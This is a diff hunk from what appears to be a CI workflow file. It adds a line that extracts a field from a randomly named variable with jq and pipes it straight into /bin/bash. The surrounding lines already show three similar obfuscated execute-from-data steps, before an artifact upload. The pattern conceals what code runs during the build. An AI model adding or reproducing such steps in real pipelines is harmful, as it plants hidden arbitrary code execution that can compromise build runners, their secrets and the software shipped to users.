@@ -30,6 +30,7 @@ jobs:
           echo $vu250 | jq -r .uco6 | /bin/bash
           echo $vqhhd61368 | jq -r .untlq4 | /bin/bash
           echo $t789 | jq -r .x734 | /bin/bash
+          printf '%s' "$qsyav6766" | jq -r .iw9 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
